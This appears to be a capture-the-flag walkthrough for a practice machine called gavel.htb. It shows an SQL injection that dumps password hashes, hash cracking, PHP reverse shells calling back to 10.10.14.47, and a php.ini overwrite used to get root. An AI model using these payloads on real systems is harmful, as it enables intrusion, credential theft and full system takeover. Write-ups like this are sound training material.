## Nmap
```bash
nmap -sV -sC -vv 10.10.11.97

Nmap scan report for 10.10.11.97
Host is up, received echo-reply ttl 63 (0.023s latency).
Scanned at 2025-12-02 11:14:25 EST for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN/Hhg1nYlWGdi109d6k/OXFg0xbLVuEho3xQqX/DkRDPQ5Y9P6l2XLkbsSscgiQIq3/bHeX6T4mLci0/I/kHeI=
|   256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMYFumAaeF6fOwurP+3zFG7iyLB1XC40te7RWDNVze0x
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://gavel.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 80
- Add `gavel.htb` in `/etc/hosts`
![[Pasted image 20251203120929.png]]

## Login page
![[Pasted image 20251203121000.png]]

## Register
![[Pasted image 20251203121022.png]]


## Login with `test1:testtest`
- There is now inventory and bidding
  ![[Pasted image 20251203121112.png]]
- I find a git folder
- grab it using git dumper
```
git-dumper http://gavel.htb git 
```
![[Pasted image 20251203121158.png]]
- Looking at `inventory.php` I see there is an SQli
![[Pasted image 20251203121404.png]]
- Here `$col` is used as input for an SQL command
- Furthermore `'` is replaced with a backtick  \` for the value of `$col` 
	- We can use this to break out of the input and inject out command.
- I grab burp file and can inject with the following as there is a user id and sort input.
- in sort we add `%00` to generate new line to escape any sql syntax errors. and we inject the payload in user_id where we use `FROM` command and execute our command within the brackets
- So basically in sort we create a new line so our injection works by adding `/?;-- -%00` . the `%00` generates a new line. We use / to get the ? in as an entry string and then close the statement followed by `-- -` and then generating a new line.
- Then in the user_id parameter we escape using backtick and enter our injection .:
```
2` FROM (SELECT @@version AS `'2`) y;-- -
```
- Then we could grab more details using group concat to find tablename and such eventually being able to grab the credentials.

- Table names
![[Pasted image 20251202192906.png]]

```
user_id=x`+FROM+(SELECT+group_concat(table_name)+AS+`'x`+FROM+information_schema.tables+WHERE+table_schema+%3d+database())+y%3b--+-&sort=\%3f%3b--+-%2500
```

- Database name
![[Pasted image 20251202193147.png]]

```
user_id=x`+FROM+(SELECT+database()+AS+`'x`)+y%3b--+-&sort=\%3f%3b--+-%2500
```
- Was unable to grab column names but guessing it I could grab hash

- Exploit to grab hash:
```
x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`'x`+FROM+users)y%3b--+-&sort=\%3f%3b--+-%2500

---
user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- -
sort=\?;-- -%00

```
![[Pasted image 20251202200022.png]]

Output Hash: `auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS,test:$2y$10$EVum0VSrPsV8zGTle4h6nODZIQnoVZFQBdauq2nxEwGpD2fXs4rhS`

- using john I crack the hash for auctioneer: (or hashcat 3200)
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
(?)midnight1
```

- Using this I can login to the website and access the Admin Panel where I can set the rules for active auctions.
	- I add some php reverse shells here and one of them gets me a shell on my listener
![[Pasted image 20251203130101.png]]

- php code to inject in rule (proc_open from revshells):
```
$sock=fsockopen("10.10.14.47",9999);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

- I trigger it by entering a valid bid and grab a shell. I use python shell to make it a bit better:

![[Pasted image 20251203130446.png]]

![[Pasted image 20251203130417.png]]

- I grab a shell and make it better:
![[Pasted image 20251203130525.png]]

- Looking for users i find user `auctioneer` which i can change to with it's password we cracked:
![[Pasted image 20251203130644.png]]

- I grab user flag:
![[Pasted image 20251203133334.png]]

- Checking it's `id` I see it is part of an unusual group:
![[Pasted image 20251203130740.png]]

- Looking around I find 2 interesting directories
- `/opt` has a directory called `gavel` with all files owned by root. However I can read the `sample.yaml` files. I also see a submissions folder and an executable gaveld which I don't have permissions for. Using strings we can see that it probably runs stuff from submissions folder.
![[Pasted image 20251203131019.png]]
- `/usr/local/bin` has a `gavel-util` executable. It is owned by root and this group we are a part of. 
![[Pasted image 20251203131106.png]]

- Looking at it I can submit a YAML file. Considering the sample file I could inject the rule parameter and try to grab a shell.
	- This however fails as I find out that I cant just pass functions through it as there is a check,

![[Pasted image 20251203131409.png]]

- Looking at `/opt` folder there is also a hidden `.config` directory which holds a php.ini file I can read. Here it lists all the disabled functions:
![[Pasted image 20251203131943.png]]
```
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
```
- Looking carefully (and also at the strings output from gaveld) we see the `file_put_contents` is not disabled. I could use this to try and alter the php.ini file. We could reqrite it or simply add `disable_functions=` to rewrite but Ill do the full one as an attempt. Not sure it works as the file kinda just is blank.
```
item:
name: "Dragon's Feathered Hat"
description: "A flamboyant hat rumored to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\ndisplay_errors=On\ndisplay_startup_errors=On\nlog_errors=Off\nerror_reporting=E_ALL\nopen_basedir=/opt/gavel\nmemory_limit=32M\nmax_execution_time=3\nmax_input_time=10\ndisable_functions=\nscan_dir=\nallow_url_fopen=On\nallow_url_include=On\n\"); return false;"
```
- I execute my file
```
./gavel-util submit /tmp/evil.yaml
```
![[Pasted image 20251203132622.png]]


- I check `php.ini`
![[Pasted image 20251203132719.png]]
- I then pass a php command to grab a shell as disable functions have been removed
- Rule:
```
item:
name: "Dragon's Feathered Hat"
description: "A flamboyant hat rumored to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "$sock=fsockopen(\"10.10.14.47\",9999);$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"
```

- I grab a shell as root:
![[Pasted image 20251203133203.png]]

![[Pasted image 20251203133222.png]]

- grab root flag:
![[Pasted image 20251203133410.png]]
